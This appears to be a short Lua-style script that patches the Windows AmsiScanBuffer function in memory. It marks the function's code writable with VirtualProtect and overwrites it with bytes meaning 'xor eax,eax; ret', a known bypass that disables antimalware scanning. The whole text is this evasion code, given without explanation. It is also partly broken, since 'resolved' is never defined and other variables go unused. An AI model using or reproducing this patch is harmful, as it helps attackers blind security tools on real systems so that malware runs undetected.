local native = require("native")
local lib = native.load("amsi")
local api = "AmsiScanBuffer"
local entry = native.cast("uint8_t*", resolved)
kernel.VirtualProtect(entry, 32, 64, old)
entry[0] = 49 entry[1] = 192 entry[2] = 195
